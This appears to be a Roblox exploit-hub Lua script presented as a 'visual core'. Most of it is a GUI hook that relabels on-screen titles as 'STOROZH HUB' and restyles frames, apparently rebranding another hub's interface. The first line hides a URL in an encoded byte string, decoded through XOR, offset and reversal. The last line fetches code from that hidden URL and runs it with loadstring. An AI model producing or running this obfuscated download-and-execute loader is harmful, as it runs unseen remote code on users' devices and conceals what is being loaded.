
--[[ STAGE 2: VISUAL CORE ]]
local jxA9yD3uuBcpeB3iQvBG="\170\191\185\248\253\254\009\009\006\184\006\010\176\187\182\200\206\197\170\183\211\205\196\208\204\166\190\201\207\220\194\212\210\197\218\226\215\209\216\188\204\043\044\207\190\203\186\211\218\230\228\233\222\244\206\043\237\235\228\241\048\244\245\233\252\241\234\245\253\238\058\246\000\254\244\001\250\003\248\004\004\006\070\009\008\253\075\022\013\007\025\016\016\005\023\013\024\031\011\033\023\036\024\019\093\037\020\036\096\097\111\039\043\048\049\038"local HjfWHoTVf9th_rjLbyfU=67 local mPk8qYEB_KIh=109 local pB8SJuaNxRdc24I_HlkLkM=0 local J8GajzhUvieKpDA5mczo=1 local bASdtnsqVhWkgLm=26 local QKlqobtkBcs23GpEoh=true local usKFQZfz2JoU0b8S=bit32 and bit32.bxor if not usKFQZfz2JoU0b8S then usKFQZfz2JoU0b8S=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local mUkBbvpONsntU={}for bBbqdCMoRhdL=1,#jxA9yD3uuBcpeB3iQvBG do local VLkWjyIJR0uZk4F=string.byte(jxA9yD3uuBcpeB3iQvBG,bBbqdCMoRhdL)local xyXVm5QxHYqp=(mPk8qYEB_KIh+(bBbqdCMoRhdL*J8GajzhUvieKpDA5mczo)+bASdtnsqVhWkgLm)%256 if pB8SJuaNxRdc24I_HlkLkM==0 then VLkWjyIJR0uZk4F=(VLkWjyIJR0uZk4F-xyXVm5QxHYqp)%256 mUkBbvpONsntU[bBbqdCMoRhdL]=string.char(usKFQZfz2JoU0b8S(VLkWjyIJR0uZk4F,HjfWHoTVf9th_rjLbyfU))else VLkWjyIJR0uZk4F=usKFQZfz2JoU0b8S(VLkWjyIJR0uZk4F,HjfWHoTVf9th_rjLbyfU)mUkBbvpONsntU[bBbqdCMoRhdL]=string.char((VLkWjyIJR0uZk4F-xyXVm5QxHYqp)%256)end end local Wap4pVSawXZUMWkkvvda=table.concat(mUkBbvpONsntU)if QKlqobtkBcs23GpEoh then Wap4pVSawXZUMWkkvvda=string.reverse(Wap4pVSawXZUMWkkvvda)end local nJDNC4z9PR2uMpC2X8v=Wap4pVSawXZUMWkkvvda
local HubName = "STOROZH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(nJDNC4z9PR2uMpC2X8v))()
